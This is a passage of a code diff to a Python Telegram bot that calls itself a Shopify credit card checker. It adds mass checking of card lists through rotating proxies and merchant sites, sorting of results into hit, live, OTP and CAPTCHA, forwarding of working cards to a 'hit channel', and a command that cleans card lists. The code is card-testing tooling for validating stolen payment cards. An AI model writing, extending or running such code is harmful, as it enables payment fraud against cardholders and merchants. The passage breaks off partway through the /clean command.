-            # Get user's first name from database
-            user = await users_col.find_one({'user_id': user_id})
-            first_name = user.get('first_name', 'User') if user else 'User'
+            first_name = await get_cached_user_first_name(user_id)
             
             # Determine hit status - FIXED VERSION
             hit_status = "failed"
@@ -1363,6 +1941,10 @@ async def result_handler():
             # Check for OTP status
             elif response in ['OTP_REQUIRED', 'ACTION_REQUIRED', '2FACTOR'] or any(k in str(response) for k in twofactor_keys):
                 hit_status = "otp"
+            elif "CAPTCHA_REQUIRED" in str(response).upper():
+                hit_status = "captcha"
+                if task_type == 'mchk' and batch_id and mchk_send_captcha_file:
+                    add_batch_captcha_card(batch_id, full_cc)
             # Check for LIVE status
             elif response in ['CCN', 'INCORRECT_CVC', 'INSUFFICIENT_FUNDS'] or any(k in str(response) for k in ccn_keys):
                 hit_status = "live"
@@ -1423,7 +2005,7 @@ by @still_alivenow"""
                         disable_web_page_preview=True
                     )
                     if HIT_CHANNEL and hit_status in ['hit', 'live']:
-                        time.sleep(0.3)
+                        await asyncio.sleep(0.3)
                         await app.send_message(
                             chat_id=HIT_CHANNEL,
                             text=formatted_message,
@@ -1434,8 +2016,11 @@ by @still_alivenow"""
                     logger.error(f"Error sending message to user {user_id}: {e}")
             
             elif task_type in ['mchk', 'chksite']:
-                # For mass checks, only send HIT and LIVE cards
-                if hit_status in ['hit', 'live', 'otp']:
+                should_send = hit_status in ['hit', 'live', 'otp']
+                if task_type == 'mchk' and not mchk_show_live_otp:
+                    should_send = hit_status == 'hit'
+
+                if should_send:
                     try:
                         await app.send_message(
                             chat_id=user_id,
@@ -1444,7 +2029,7 @@ by @still_alivenow"""
                             disable_web_page_preview=True
                         )
                         if HIT_CHANNEL and hit_status in ['hit', 'live']:
-                            time.sleep(0.3)
+                            await asyncio.sleep(0.3)
                             await app.send_message(
                                 chat_id=HIT_CHANNEL,
                                 text=formatted_message,
@@ -1468,8 +2053,11 @@ by @still_alivenow"""
                             'hit': 0,
                             'live': 0,
                             'otp': 0,
+                            'captcha': 0,
                             'failed': 0,
-                            'start_time': datetime.now()
+                            'start_time': datetime.now(),
+                            'last_update_checked': 0,
+                            'last_update_at': 0.0
                         }
                         task_messages[msg_id] = original_message
                         task_users[msg_id] = user_id
@@ -1482,42 +2070,154 @@ by @still_alivenow"""
                         task_stats[msg_id]['live'] += 1
                     elif hit_status == 'otp':
                         task_stats[msg_id]['otp'] += 1
+                    elif hit_status == 'captcha':
+                        task_stats[msg_id]['captcha'] += 1
                     else:
                         task_stats[msg_id]['failed'] += 1
                     
-                    # Update progress message
-                    await update_task_progress(msg_id, task_stats[msg_id])
+                    is_complete = task_stats[msg_id]['checked'] >= task_stats[msg_id]['total']
+                    if should_update_progress(task_stats[msg_id], force=is_complete):
+                        await update_task_progress(msg_id, task_stats[msg_id])
                     
-                    # Clean up if task is complete
-                    if task_stats[msg_id]['checked'] >= task_stats[msg_id]['total']:
+                    if is_complete:
+                        if task_type == 'mchk' and batch_id and mchk_send_captcha_file:
+                            await send_batch_captcha_file(user_id, batch_id)
                         # Keep stats for a while then clean up
                         asyncio.create_task(cleanup_task_data(msg_id, delay=300))
+                        if task_type == 'mchk' and batch_id:
+                            finalize_mchk_batch(batch_id)
                             
                 except Exception as e:
                     logger.error(f"Error updating progress: {e}")
+            
+            mark_task_done(user_id)
             
             RESULT_QUEUE.task_done()
             
         except Exception as e:
             logger.error(f"Result handler error: {e}")
+            if user_id is not None:
+                mark_task_done(user_id)
             RESULT_QUEUE.task_done()
 
 async def cleanup_task_data(msg_id, delay=300):
     """Clean up task data after delay"""
     await asyncio.sleep(delay)
-    task_stats.pop(msg_id, None)
+    stats = task_stats.pop(msg_id, None)
     task_messages.pop(msg_id, None)
     task_users.pop(msg_id, None)
+    if isinstance(stats, dict):
+        batch_id = stats.get('batch_id')
+        if batch_id:
+            finalize_mchk_batch(batch_id)
 
 # Callback query handler
 @app.on_callback_query()
 async def handle_callback(client, callback_query: CallbackQuery):
     """Handle callback queries from inline buttons"""
+    data = callback_query.data or ""
+
+    if data.startswith("mchk_pref:"):
+        try:
+            _, choice_token, pref_id = data.split(":", 2)
+        except ValueError:
+            await callback_query.answer("Invalid selection", show_alert=True)
+            return
+
+        session = mchk_pref_sessions.get(pref_id)
+        if not session:
+            await callback_query.answer("This selection has expired", show_alert=True)
+            return
+
+        user = callback_query.from_user
+        if not user or user.id != session.get('user_id'):
+            await callback_query.answer("This button is not for you", show_alert=True)
+            return
+
+        choice = 'yes' if choice_token == 'y' else 'no'
+        session['choice'] = choice
+        session['event'].set()
+
+        choice_text = "Yes (HIT + LIVE + OTP)" if choice == 'yes' else "No (HIT only)"
+        await callback_query.answer(f"Selected: {choice_text}")
+
+        try:
+            await callback_query.message.edit_reply_markup(reply_markup=None)
+        except Exception:
+            pass
+        return
+
+    if data.startswith("mchk_captcha_pref:"):
+        try:
+            _, choice_token, pref_id = data.split(":", 2)
+        except ValueError:
+            await callback_query.answer("Invalid selection", show_alert=True)
+            return
+
+        session = mchk_captcha_pref_sessions.get(pref_id)
+        if not session:
+            await callback_query.answer("This selection has expired", show_alert=True)
+            return
+
+        user = callback_query.from_user
+        if not user or user.id != session.get('user_id'):
+            await callback_query.answer("This button is not for you", show_alert=True)
+            return
+
+        choice = 'yes' if choice_token == 'y' else 'no'
+        session['choice'] = choice
+        session['event'].set()
+
+        choice_text = "Yes (send CAPTCHA txt)" if choice == 'yes' else "No"
+        await callback_query.answer(f"Selected: {choice_text}")
+
+        try:
+            await callback_query.message.edit_reply_markup(reply_markup=None)
+        except Exception:
+            pass
+        return
+
+    if data.startswith("stopmchk_batch:"):
+        batch_id = data.split(":", 1)[1].strip()
+        user = callback_query.from_user
+        if not user:
+            await callback_query.answer("User not found", show_alert=True)
+            return
+
+        cancel_info = cancel_user_mchk_batches(user.id, batch_ids=[batch_id])
+        cancelled_batches = cancel_info.get('cancelled_batches', [])
+        removed_pending = cancel_info.get('removed_pending', 0)
+        msg_ids = set(cancel_info.get('msg_ids', []))
+
+        if not cancelled_batches:
+            await callback_query.answer("Batch already stopped or finished", show_alert=True)
+            return
+
+        for msg_id in msg_ids:
+            progress_msg = task_messages.get(msg_id)
+            if not progress_msg:
+                continue
+            stats = task_stats.get(msg_id, {})
+            checked = stats.get('checked', 0)
+            total = stats.get('total', 0)
+            try:
+                await progress_msg.edit_text(
+                    f"⛔ MASS CHECK STOPPED\n\nChecked: {checked}/{total}\nPending removed: {removed_pending}",
+                    disable_web_page_preview=True
+                )
+            except Exception:
+                pass
+            asyncio.create_task(cleanup_task_data(msg_id, delay=10))
+
+        await callback_query.answer(f"Stopped batch. Removed pending: {removed_pending}")
+        return
+
     await callback_query.answer()  # Just acknowledge the callback
 
 # Database functions
 async def init_db():
     """Initialize database collections and indexes"""
+    global DB_AVAILABLE
     try:
         # Users collection indexes
         await users_col.create_index('user_id', unique=True)
@@ -1532,23 +2232,39 @@ async def init_db():
         await user_sites_col.create_index([('user_id', 1), ('sites.url', 1)])
         
         logger.info("Database initialized successfully")
+        DB_AVAILABLE = True
     except Exception as e:
+        set_db_unavailable(e)
         logger.error(f"Database initialization error: {e}")
+        logger.warning("Running with in-memory fallback storage (data will not persist across restarts).")
 
 async def get_user_proxies(user_id):
     """Get all proxies for a user"""
-    cursor = proxies_col.find({'user_id': user_id})
-    proxies = await cursor.to_list(length=None)
-    return [p['proxy'] for p in proxies]
+    if DB_AVAILABLE:
+        try:
+            cursor = proxies_col.find({'user_id': user_id})
+            proxies = await cursor.to_list(length=None)
+            proxy_values = [p['proxy'] for p in proxies if p.get('proxy')]
+            if proxy_values:
+                mem_user_proxies[user_id].update(proxy_values)
+            return proxy_values
+        except Exception as e:
+            set_db_unavailable(e)
+    return list(mem_user_proxies.get(user_id, set()))
 
 async def add_user_proxy(user_id, proxy):
     """Add a proxy for a user"""
     try:
-        await proxies_col.update_one(
-            {'user_id': user_id, 'proxy': proxy},
-            {'$set': {'user_id': user_id, 'proxy': proxy, 'added_at': datetime.utcnow()}},
-            upsert=True
-        )
+        if DB_AVAILABLE:
+            try:
+                await proxies_col.update_one(
+                    {'user_id': user_id, 'proxy': proxy},
+                    {'$set': {'user_id': user_id, 'proxy': proxy, 'added_at': utcnow()}},
+                    upsert=True
+                )
+            except Exception as db_error:
+                set_db_unavailable(db_error)
+        mem_user_proxies[user_id].add(proxy)
         return True
     except Exception as e:
         logger.error(f"Error adding proxy: {e}")
@@ -1558,47 +2274,191 @@ async def delete_user_proxy(user_id, proxy=None):
     """Delete proxy(s) for a user"""
     try:
         if proxy:
-            result = await proxies_col.delete_one({'user_id': user_id, 'proxy': proxy})
-            return result.deleted_count > 0
+            deleted = False
+            if DB_AVAILABLE:
+                try:
+                    result = await proxies_col.delete_one({'user_id': user_id, 'proxy': proxy})
+                    deleted = result.deleted_count > 0
+                except Exception as db_error:
+                    set_db_unavailable(db_error)
+            if proxy in mem_user_proxies.get(user_id, set()):
+                mem_user_proxies[user_id].discard(proxy)
+                deleted = True
+            if user_id in mem_user_proxies and not mem_user_proxies[user_id]:
+                mem_user_proxies.pop(user_id, None)
+            return deleted
         else:
-            result = await proxies_col.delete_many({'user_id': user_id})
-            return result.deleted_count > 0
+            deleted = False
+            if DB_AVAILABLE:
+                try:
+                    result = await proxies_col.delete_many({'user_id': user_id})
+                    deleted = result.deleted_count > 0
+                except Exception as db_error:
+                    set_db_unavailable(db_error)
+            if user_id in mem_user_proxies and mem_user_proxies[user_id]:
+                deleted = True
+            mem_user_proxies.pop(user_id, None)
+            return deleted
     except Exception as e:
         logger.error(f"Error deleting proxy: {e}")
         return False
 
 async def get_all_proxies():
     """Get all proxies from all users"""
-    cursor = proxies_col.find({})
-    proxies = await cursor.to_list(length=None)
-    return proxies
+    if DB_AVAILABLE:
+        try:
+            cursor = proxies_col.find({})
+            proxies = await cursor.to_list(length=None)
+            for p in proxies:
+                uid = p.get('user_id')
+                proxy = p.get('proxy')
+                if uid is not None and proxy:
+                    mem_user_proxies[uid].add(proxy)
+            return proxies
+        except Exception as e:
+            set_db_unavailable(e)
+
+    all_proxies = []
+    for uid, proxy_set in mem_user_proxies.items():
+        for proxy in proxy_set:
+            all_proxies.append({'user_id': uid, 'proxy': proxy})
+    return all_proxies
 
 async def get_user_sites(user_id):
     """Get all working sites for a user"""
-    user_sites = await user_sites_col.find_one({'user_id': user_id})
+    user_sites = None
+    if DB_AVAILABLE:
+        try:
+            user_sites = await user_sites_col.find_one({'user_id': user_id})
+        except Exception as e:
+            set_db_unavailable(e)
+            user_sites = None
+
     if user_sites and 'sites' in user_sites:
-        return [site['url'] if isinstance(site, dict) else site for site in user_sites['sites']]
-    return []
+        raw_sites = [dict(site) if isinstance(site, dict) else {'url': str(site)} for site in user_sites.get('sites', [])]
+    else:
+        raw_sites = mem_user_sites.get(user_id, [])
+
+    filtered_sites, removed_count = filter_sites_by_price_range(raw_sites)
+    mem_user_sites[user_id] = filtered_sites
+
+    if removed_count > 0 and DB_AVAILABLE:
+        try:
+            await user_sites_col.update_one(
+                {'user_id': user_id},
+                {'$set': {'user_id': user_id, 'sites': filtered_sites}},
+                upsert=True
+            )
+        except Exception as e:
+            set_db_unavailable(e)
+
+    return [site.get('url') for site in filtered_sites if site.get('url')]
+
+async def get_user_sites_doc(user_id):
+    """Get full user sites doc, with memory fallback."""
+    user_sites = None
+    if DB_AVAILABLE:
+        try:
+            user_sites = await user_sites_col.find_one({'user_id': user_id})
+        except Exception as e:
+            set_db_unavailable(e)
+            user_sites = None
+
+    if user_sites and 'sites' in user_sites:
+        raw_sites = [dict(site) if isinstance(site, dict) else {'url': str(site)} for site in user_sites.get('sites', [])]
+    else:
+        raw_sites = mem_user_sites.get(user_id, [])
+
+    filtered_sites, removed_count = filter_sites_by_price_range(raw_sites)
+    mem_user_sites[user_id] = filtered_sites
+
+    if removed_count > 0 and DB_AVAILABLE:
+        try:
+            await user_sites_col.update_one(
+                {'user_id': user_id},
+                {'$set': {'user_id': user_id, 'sites': filtered_sites}},
+                upsert=True
+            )
+        except Exception as e:
+            set_db_unavailable(e)
+
+    if not filtered_sites:
+        return None
+    return {'user_id': user_id, 'sites': filtered_sites}
+
+async def replace_user_sites(user_id, sites):
+    """Replace user sites list in storage."""
+    normalized_sites = [dict(site) if isinstance(site, dict) else {'url': str(site)} for site in sites]
+    mem_user_sites[user_id] = normalized_sites
+    if DB_AVAILABLE:
+        try:
+            await user_sites_col.update_one(
+                {'user_id': user_id},
+                {'$set': {'user_id': user_id, 'sites': normalized_sites}},
+                upsert=True
+            )
+        except Exception as e:
+            set_db_unavailable(e)
+
+async def get_all_user_site_docs():
+    """Get all user site docs."""
+    if DB_AVAILABLE:
+        try:
+            cursor = user_sites_col.find({})
+            docs = await cursor.to_list(length=None)
+            for doc in docs:
+                uid = doc.get('user_id')
+                if uid is None:
+                    continue
+                mem_user_sites[uid] = [
+                    dict(site) if isinstance(site, dict) else {'url': str(site)}
+                    for site in doc.get('sites', [])
+                ]
+            return docs
+        except Exception as e:
+            set_db_unavailable(e)
+    return get_memory_all_user_site_docs()
 
 async def get_all_sites():
     """Get all global sites"""
-    cursor = sites_col.find({})
-    sites = await cursor.to_list(length=None)
-    return [s['url'] for s in sites]
+    if DB_AVAILABLE:
+        try:
+            cursor = sites_col.find({})
+            sites = await cursor.to_list(length=None)
+            urls = [s['url'] for s in sites if s.get('url')]
+            if urls:
+                mem_global_sites.update(urls)
+            return urls
+        except Exception as e:
+            set_db_unavailable(e)
+    return list(mem_global_sites)
 
 async def add_global_site(site_url):
     """Add a site to global sites"""
     try:
+        site_url = normalize_site_url(site_url)
         # Check global site limit
-        current_count = await sites_col.count_documents({})
+        current_count = len(mem_global_sites)
+        if DB_AVAILABLE:
+            try:
+                current_count = await sites_col.count_documents({})
+            except Exception as db_error:
+                set_db_unavailable(db_error)
+
         if current_count >= MAX_GLOBAL_SITES:
             return False, f"Maximum global site limit reached ({MAX_GLOBAL_SITES})"
-        
-        await sites_col.update_one(
-            {'url': site_url},
-            {'$set': {'url': site_url, 'added_at': datetime.utcnow()}},
-            upsert=True
-        )
+
+        if DB_AVAILABLE:
+            try:
+                await sites_col.update_one(
+                    {'url': site_url},
+                    {'$set': {'url': site_url, 'added_at': utcnow()}},
+                    upsert=True
+                )
+            except Exception as db_error:
+                set_db_unavailable(db_error)
+
+        mem_global_sites.add(site_url)
         return True, "Site added successfully"
     except Exception as e:
         logger.error(f"Error adding global site: {e}")
@@ -1608,11 +2468,30 @@ async def delete_global_site(site_url=None):
     """Delete global site(s)"""
     try:
         if site_url:
-            result = await sites_col.delete_one({'url': site_url})
-            return result.deleted_count > 0
+            site_url = normalize_site_url(site_url)
+            deleted = False
+            if DB_AVAILABLE:
+                try:
+                    result = await sites_col.delete_one({'url': site_url})
+                    deleted = result.deleted_count > 0
+                except Exception as db_error:
+                    set_db_unavailable(db_error)
+            if site_url in mem_global_sites:
+                mem_global_sites.discard(site_url)
+                deleted = True
+            return deleted
         else:
-            result = await sites_col.delete_many({})
-            return result.deleted_count > 0
+            deleted = False
+            if DB_AVAILABLE:
+                try:
+                    result = await sites_col.delete_many({})
+                    deleted = result.deleted_count > 0
+                except Exception as db_error:
+                    set_db_unavailable(db_error)
+            if mem_global_sites:
+                deleted = True
+            mem_global_sites.clear()
+            return deleted
     except Exception as e:
         logger.error(f"Error deleting global site: {e}")
         return False
@@ -1633,43 +2512,95 @@ async def get_random_site(user_id):
 
 async def save_user(user_id, first_name, username=None):
     """Save or update user in database"""
+    user_name_cache[user_id] = first_name
+    now_ts = utcnow()
+    existing_mem = mem_users.get(user_id, {})
+    mem_users[user_id] = {
+        'user_id': user_id,
+        'first_name': first_name,
+        'username': username,
+        'last_seen': now_ts,
+        'joined_at': existing_mem.get('joined_at', now_ts),
+        'total_checks': existing_mem.get('total_checks', 0)
+    }
+
     try:
-        await users_col.update_one(
-            {'user_id': user_id},
-            {
-                '$set': {
-                    'first_name': first_name,
-                    'username': username,
-                    'last_seen': datetime.utcnow()
+        if DB_AVAILABLE:
+            await users_col.update_one(
+                {'user_id': user_id},
+                {
+                    '$set': {
+                        'first_name': first_name,
+                        'username': username,
+                        'last_seen': now_ts
+                    },
+                    '$setOnInsert': {
+                        'joined_at': now_ts,
+                        'total_checks': 0
+                    }
                 },
-                '$setOnInsert': {
-                    'joined_at': datetime.utcnow(),
-                    'total_checks': 0
-                }
-            },
-            upsert=True
-        )
+                upsert=True
+            )
     except Exception as e:
+        set_db_unavailable(e)
         logger.error(f"Error saving user: {e}")
 
-async def increment_user_checks(user_id):
-    """Increment user's total checks count"""
+async def increment_user_checks_bulk(user_id, amount):
+    """Increment user's total checks count by amount."""
+    if amount <= 0:
+        return
+    mem_users.setdefault(user_id, {
+        'user_id': user_id,
+        'first_name': user_name_cache.get(user_id, 'User'),
+        'username': None,
+        'joined_at': utcnow(),
+        'last_seen': utcnow(),
+        'total_checks': 0
+    })
+    mem_users[user_id]['total_checks'] = mem_users[user_id].get('total_checks', 0) + amount
     try:
-        await users_col.update_one(
-            {'user_id': user_id},
-            {'$inc': {'total_checks': 1}}
-        )
+        if DB_AVAILABLE:
+            await users_col.update_one(
+                {'user_id': user_id},
+                {'$inc': {'total_checks': amount}}
+            )
     except Exception as e:
-        logger.error(f"Error incrementing user checks: {e}")
+        set_db_unavailable(e)
+        logger.error(f"Error incrementing user checks by {amount}: {e}")
+
+async def increment_user_checks(user_id):
+    """Increment user's total checks count."""
+    await increment_user_checks_bulk(user_id, 1)
 
 async def get_user_stats(user_id):
     """Get user statistics"""
-    user = await users_col.find_one({'user_id': user_id})
+    user = None
+    proxy_count = len(mem_user_proxies.get(user_id, set()))
+    sites_count = len(mem_user_sites.get(user_id, []))
+
+    if DB_AVAILABLE:
+        try:
+            user = await users_col.find_one({'user_id': user_id})
+            if user:
+                mem_users[user_id] = {
+                    'user_id': user_id,
+                    'first_name': user.get('first_name', 'Unknown'),
+                    'username': user.get('username'),
+                    'joined_at': user.get('joined_at'),
+                    'last_seen': user.get('last_seen'),
+                    'total_checks': user.get('total_checks', 0)
+                }
+            proxy_count = await proxies_col.count_documents({'user_id': user_id})
+            sites_count = len(await get_user_sites(user_id))
+        except Exception as e:
+            set_db_unavailable(e)
+
+    if not user:
+        user = get_memory_user_doc(user_id)
     if not user:
         return None
-    
-    proxy_count = await proxies_col.count_documents({'user_id': user_id})
-    sites_count = len(await get_user_sites(user_id))
+
+    active_task_stats = get_active_task_stats(user_id)
     
     return {
         'user_id': user_id,
@@ -1679,7 +2610,10 @@ async def get_user_stats(user_id):
         'last_seen': user.get('last_seen'),
         'total_checks': user.get('total_checks', 0),
         'proxy_count': proxy_count,
-        'sites_count': sites_count
+        'sites_count': sites_count,
+        'active_tasks': active_task_stats['active_total'],
+        'active_queued': active_task_stats['active_queued'],
+        'active_processing': active_task_stats['active_processing']
     }
 
 # Bot commands
@@ -1697,7 +2631,9 @@ I'm a Shopify Credit Card Checker Bot. Here are my commands:
 /chk CC|MM|YYYY|CVV - Check a single card (all responses sent)
 
 🔹 <b>Mass Check</b>
-/mchk - Send up to 15 cards (one per line) or reply to a .txt file (only hits/live cards sent)
+/mchk - Send up to {MAX_MASS_CHECK_CARDS} cards (one per line) or reply to a .txt file
+/stopmchk - Stop your current mass check batch
+/clean - Reply to a txt/message to clean CCs (one per line output txt)
 
 🔹 <b>Site Checker</b>
 /chksite - Test sites and get working ones (reply to .txt file with sites)
@@ -1766,10 +2702,8 @@ async def chk_command(client, message):
     )
     
     # Generate task ID
-    task_id = f"{user.id}_{int(time.time())}_{random.randint(1000, 9999)}"
-    
-    # Add to task queue
-    await TASK_QUEUE.put({
+    task_id = f"{user.id}_{int(time.time() * 1000)}_{random.randint(1000, 9999)}"
+    task_payload = {
         'user_id': user.id,
         'cc_data': cc_parts,
         'site': site,
@@ -1777,13 +2711,19 @@ async def chk_command(client, message):
         'message': processing_msg,
         'type': 'single',
         'task_id': task_id
-    })
+    }
+    queued_ok, queue_msg = enqueue_user_task(task_payload)
+    if not queued_ok:
+        await processing_msg.edit_text(f"❌ {queue_msg}", disable_web_page_preview=True)
+        return
+
+    register_queued_tasks(user.id, 1)
     
     await increment_user_checks(user.id)
 
 @app.on_message(filters.command('mchk') & filters.private)
 async def mchk_command(client, message):
-    """Mass card check command (up to 15 cards)"""
+    """Mass card check command (up to MAX_MASS_CHECK_CARDS cards)"""
     user = message.from_user
     await save_user(user.id, user.first_name, user.username)
     
@@ -1806,10 +2746,18 @@ async def mchk_command(client, message):
             cards = [line.strip() for line in message.reply_to_message.text.split('\n') if line.strip()]
     
     if not cards:
-        await message.reply_text("❌ Please provide cards (one per line, max 15)", disable_web_page_preview=True)
+        await message.reply_text(
+            f"❌ Please provide cards (one per line, max {MAX_MASS_CHECK_CARDS})",
+            disable_web_page_preview=True
+        )
         return
     
-    cards = cards
+    if len(cards) > MAX_MASS_CHECK_CARDS:
+        await message.reply_text(
+            f"❌ Too many cards: {len(cards)}\nMax allowed: {MAX_MASS_CHECK_CARDS}",
+            disable_web_page_preview=True
+        )
+        return
     
     # Validate cards
     valid_cards = []
@@ -1817,12 +2765,12 @@ async def mchk_command(client, message):
     for card in cards:
         try:
             cc_parts = parse_cc_string(card)
-            valid_cards.append((card, cc_parts))
+            valid_cards.append(cc_parts)
         except ValueError:
             invalid_cards.append(card)
     
-    if invalid_cards:
-        await message.reply_text(f"❌ Invalid cards found: {len(invalid_cards)}", disable_web_page_preview=True)
+    if not valid_cards:
+        await message.reply_text("❌ No valid cards found in input", disable_web_page_preview=True)
         return
     
     # Get user's proxies
@@ -1835,30 +2783,143 @@ async def mchk_command(client, message):
         if not global_sites:
             await message.reply_text("❌ No sites available! Please ask admin to add sites.", disable_web_page_preview=True)
             return
-        sites = [random.choice(global_sites) for _ in range(len(valid_cards))]
+        site_pool = global_sites
     else:
-        sites = [random.choice(user_sites) for _ in range(len(valid_cards))]
-    
-    # Create progress message
-    progress_text = f"""TASK
-USER: {user.first_name}
-START TIME: {datetime.now().strftime('%H:%M:%S')}
-ELAPSED: 0:00:00
+        site_pool = user_sites
 
-CREATED BY @still_alivenow"""
+    capacity = get_user_enqueue_capacity(user.id)
+    if capacity <= 0:
+        await message.reply_text(
+            "❌ System is busy right now. Try again in a moment.",
+            disable_web_page_preview=True
+        )
+        return
+
+    accepted_cards = valid_cards[:capacity]
+    dropped_for_capacity = max(0, len(valid_cards) - len(accepted_cards))
+
+    # Ask user how to deliver approved results
+    pref_id = hashlib.md5(
+        f"{user.id}:{time.time_ns()}:{random.random()}".encode()
+    ).hexdigest()[:12]
+    pref_event = asyncio.Event()
+    mchk_pref_sessions[pref_id] = {
+        'user_id': user.id,
+        'choice': None,
+        'event': pref_event,
+        'created_at': time.time()
+    }
+
+    pref_text = (
+        "Do you want Approved CC in txt?\n"
+        "Choose Yes to receive Approved CCs in chat.\n\n"
+        "Choose No to only receive Charged CC."
+    )
+    pref_keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("Yes", callback_data=f"mchk_pref:y:{pref_id}")],
+        [InlineKeyboardButton("No", callback_data=f"mchk_pref:n:{pref_id}")]
+    ])
+    pref_message = await message.reply_text(
+        pref_text,
+        reply_markup=pref_keyboard,
+        disable_web_page_preview=True
+    )
+
+    send_live_otp = False
+    try:
+        await asyncio.wait_for(pref_event.wait(), timeout=60)
+        selected_choice = mchk_pref_sessions.get(pref_id, {}).get('choice', 'no')
+        send_live_otp = selected_choice == 'yes'
+    except asyncio.TimeoutError:
+        send_live_otp = False
+    finally:
+        mchk_pref_sessions.pop(pref_id, None)
+
+    selected_text = "Yes (HIT + LIVE + OTP)" if send_live_otp else "No (HIT only)"
+    try:
+        await pref_message.edit_text(
+            f"{pref_text}\n\n✅ Selected: {selected_text}",
+            disable_web_page_preview=True
+        )
+    except Exception:
+        pass
+
+    # Ask user whether to send CAPTCHA_REQUIRED cards as txt after completion
+    captcha_pref_id = hashlib.md5(
+        f"captcha:{user.id}:{time.time_ns()}:{random.random()}".encode()
+    ).hexdigest()[:12]
+    captcha_pref_event = asyncio.Event()
+    mchk_captcha_pref_sessions[captcha_pref_id] = {
+        'user_id': user.id,
+        'choice': None,
+        'event': captcha_pref_event,
+        'created_at': time.time()
+    }
+
+    captcha_pref_text = (
+        "Send CAPTCHA_REQUIRED cards as txt file when mass check completes?"
+    )
+    captcha_pref_keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("Yes", callback_data=f"mchk_captcha_pref:y:{captcha_pref_id}")],
+        [InlineKeyboardButton("No", callback_data=f"mchk_captcha_pref:n:{captcha_pref_id}")]
+    ])
+    captcha_pref_message = await message.reply_text(
+        captcha_pref_text,
+        reply_markup=captcha_pref_keyboard,
+        disable_web_page_preview=True
+    )
+
+    send_captcha_file = True
+    try:
+        await asyncio.wait_for(captcha_pref_event.wait(), timeout=45)
+        captcha_choice = mchk_captcha_pref_sessions.get(captcha_pref_id, {}).get('choice', 'yes')
+        send_captcha_file = captcha_choice == 'yes'
+    except asyncio.TimeoutError:
+        send_captcha_file = True
+    finally:
+        mchk_captcha_pref_sessions.pop(captcha_pref_id, None)
+
+    try:
+        await captcha_pref_message.edit_text(
+            f"{captcha_pref_text}\n\n✅ Selected: {'Yes' if send_captcha_file else 'No'}",
+            disable_web_page_preview=True
+        )
+    except Exception:
+        pass
+    
+    batch_id = f"mchk_{user.id}_{int(time.time() * 1000)}_{random.randint(1000, 9999)}"
+
+    # Create progress message
+    progress_text = f"""💳 <b>CARD PROCESSOR</b>
+━━━━━━━━━━━━━━
+📂 Total Cards: {len(accepted_cards)}
+📤 Processed: 0
+━━━━━━━━━━━━━━
+🎯 <b>RESULTS BREAKDOWN</b>
+• ✅ Live: 0
+• ❌ Dead: 0
+• 💎 Hits: 0
+• 🧩 Captcha: 0
+━━━━━━━━━━━━━━
+⏱️ Duration: 0.0s
+👤 {user.first_name}"""
 
     keyboard = InlineKeyboardMarkup([
         [
-            InlineKeyboardButton(f"TOTAL {len(valid_cards)}", callback_data="ignore"),
-            InlineKeyboardButton(f"CHECKED 0", callback_data="ignore")
+            InlineKeyboardButton(f"TOTAL {len(accepted_cards)}", callback_data="ignore"),
+            InlineKeyboardButton("CHECKED 0", callback_data="ignore")
         ],
         [
-            InlineKeyboardButton(f"HIT 0", callback_data="ignore"),
-            InlineKeyboardButton(f"LIVE 0", callback_data="ignore")
+            InlineKeyboardButton("HIT 0", callback_data="ignore"),
+            InlineKeyboardButton("LIVE 0", callback_data="ignore")
         ],
         [
-            InlineKeyboardButton(f"OTP 0", callback_data="ignore"),
-            InlineKeyboardButton(f"FAILED 0", callback_data="ignore")
+            InlineKeyboardButton("OTP 0", callback_data="ignore"),
+            InlineKeyboardButton("CAPTCHA 0", callback_data="ignore"),
+            InlineKeyboardButton("FAILED 0", callback_data="ignore")
+        ],
+        [
+            InlineKeyboardButton("⏹️ Stop", callback_data=f"stopmchk_batch:{batch_id}")
         ]
     ])
     
@@ -1868,38 +2929,171 @@ CREATED BY @still_alivenow"""
         parse_mode=ParseMode.HTML,
         disable_web_page_preview=True
     )
-    
+
     # Store task info
     msg_id = processing_msg.id
     task_stats[msg_id] = {
-        'total': len(valid_cards),
+        'total': len(accepted_cards),
         'checked': 0,
         'hit': 0,
         'live': 0,
         'otp': 0,
+        'captcha': 0,
         'failed': 0,
-        'start_time': datetime.now()
+        'start_time': datetime.now(),
+        'last_update_checked': 0,
+        'last_update_at': 0.0,
+        'batch_id': batch_id,
+        'task_type': 'mchk',
+        'mchk_send_captcha_file': send_captcha_file
     }
     task_messages[msg_id] = processing_msg
     task_users[msg_id] = user.id
+    register_mchk_batch(user.id, batch_id, msg_id)
     
-    # Add cards to queue
-    for i, (card_str, cc_parts) in enumerate(valid_cards):
+    # Add cards to fair pending queue
+    queued_cards = 0
+    for i, cc_parts in enumerate(accepted_cards):
         proxy = random.choice(user_proxies) if user_proxies else None
-        site = sites[i]
-        task_id = f"{user.id}_{int(time.time())}_{i}"
-        
-        await TASK_QUEUE.put({
+        site = random.choice(site_pool)
+        task_id = f"{user.id}_{int(time.time() * 1000)}_{i}"
+
+        queued_ok, _ = enqueue_user_task({
             'user_id': user.id,
             'cc_data': cc_parts,
             'site': site,
             'proxy': proxy,
             'message': processing_msg,
             'type': 'mchk',
-            'task_id': task_id
+            'task_id': task_id,
+            'mchk_show_live_otp': send_live_otp,
+            'mchk_send_captcha_file': send_captcha_file,
+            'batch_id': batch_id
         })
-        
-        await increment_user_checks(user.id)
+        if not queued_ok:
+            break
+        queued_cards += 1
+        register_queued_tasks(user.id, 1)
+        if (i + 1) % 1000 == 0:
+            await asyncio.sleep(0)
+
+    if queued_cards != len(accepted_cards):
+        task_stats[msg_id]['total'] = queued_cards
+        dropped_for_capacity += len(accepted_cards) - queued_cards
+        if queued_cards == 0:
+            task_stats.pop(msg_id, None)
+            task_messages.pop(msg_id, None)
+            task_users.pop(msg_id, None)
+            finalize_mchk_batch(batch_id)
+            await processing_msg.edit_text("❌ Queue is full. Please try again shortly.", disable_web_page_preview=True)
+            return
+    await increment_user_checks_bulk(user.id, queued_cards)
+
+    if invalid_cards:
+        await message.reply_text(
+            f"⚠️ Skipped invalid cards: {len(invalid_cards)}",
+            disable_web_page_preview=True
+        )
+    if dropped_for_capacity:
+        await message.reply_text(
+            f"⚠️ Queue limit reached. Accepted: {queued_cards} | Skipped: {dropped_for_capacity}",
+            disable_web_page_preview=True
+        )
+
+@app.on_message(filters.command('clean') & filters.private)
+async def clean_command(client, message):
+    """Clean CC lines from replied text/txt and return normalized txt."""
+    user = message.from_user
+    await save_user(user.id, user.first_name, user.username)
+
+    lines = []
+    tmp_file = None
+    try:
+        if message.reply_to_message:
+            if message.reply_to_message.document:
